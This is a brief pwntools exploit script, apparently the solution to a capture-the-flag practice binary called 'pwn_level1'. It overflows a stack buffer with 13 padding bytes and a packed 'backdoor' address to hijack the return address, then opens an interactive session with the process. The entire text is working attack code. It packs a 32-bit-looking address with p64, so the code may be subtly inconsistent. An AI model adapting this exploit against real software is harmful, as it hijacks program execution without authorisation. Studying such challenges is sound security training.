from pwn import *
p = process("./pwn_level1")
backdoor = 0x804849A
str = 'a' * 13
payload = str.encode() + p64(backdoor)
p.recvuntil(b"try to stackoverflow!!\n")
p.sendline(payload)
p.interactive()